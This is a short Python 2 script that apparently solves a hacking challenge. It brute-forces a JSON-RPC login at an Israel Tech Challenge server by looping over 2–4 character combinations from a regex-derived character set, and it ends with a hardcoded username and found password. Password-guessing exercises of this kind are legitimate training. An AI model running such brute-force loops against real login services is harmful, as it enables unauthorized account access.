import pyjsonrpc

def try_hack(http_client, pwd):
    try:
	return http_client.call("login", 'ITC', pwd)
    except:
	return -1

def force_hack_2(http_client, potential_chars):
    for x in potential_chars:
	for y in potential_chars:
	    pwd = x+''+y
	    response = try_hack(http_client, pwd)
	    if response != -1:
		return pwd
    print "done"
def force_hack_3(http_client, potential_chars):
    for x in potential_chars:
	for y in potential_chars:
	    for z in potential_chars:
		pwd = x+''+y+''+z
		response = try_hack(http_client, pwd)
		if response != -1:
		    return pwd
    print "done"

def force_hack_4(http_client, potential_chars):
    for x in potential_chars:
	for y in potential_chars:
	    for z in potential_chars:
		for n in potential_chars:
		    pwd = x+''+y+''+z+''+n
		    response = try_hack(http_client, pwd)
		    if response != -1:
			return pwd
    print "done"
http_client = pyjsonrpc.HttpClient(
    url = "http://hack.israeltechallenge.com:8000",
    username = "ITC"
)

#^[k-n3-5#]{2,4}$
#klmn345#
options = "klnb345#"

print http_client.call("help")
print http_client.call("ping")
username = 'ITC'
password = 'l33#'

print http_client.call("login", username, password)
